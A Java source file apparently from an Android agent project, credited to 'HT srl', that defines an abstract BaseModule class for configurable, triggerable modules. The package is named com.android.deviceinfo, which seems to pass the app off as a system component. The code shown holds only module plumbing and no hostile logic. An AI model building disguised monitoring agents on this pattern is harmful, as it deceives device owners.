/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.deviceinfo.module;

import com.android.deviceinfo.ThreadBase;
import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.util.Check;

/**
 * The Class AgentBase.
 */
public abstract class BaseModule extends ThreadBase {
	private static final String TAG = "BaseModule"; //$NON-NLS-1$
	private ConfModule conf;
	private Trigger trigger;

	/**
	 * Parses the.
	 * 
	 * @param conf
	 *            the conf
	 * @throws ConfigurationException
	 */
	protected abstract boolean parse(ConfModule conf);

	public String getType() {
		//if (Cfg.DEBUG) {
		//	Check.requires(conf != null, "null conf");
		//}
		//return conf.getType();
		return ManagerModule.self().getType(this.getClass());
	}

	public boolean setConf(ConfModule conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		return parse(conf);
	}

	@Override
	public String toString() {
		return "Module <" + conf.getType().toUpperCase() + "> " + (isRunning() ? "running" : ""); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
	}

	public void setTrigger(Trigger trigger) {
		this.trigger = trigger;
	}
	
	public boolean isInstanced(){
		return  ManagerModule.self().isInstancedAgent(getType());
	}

}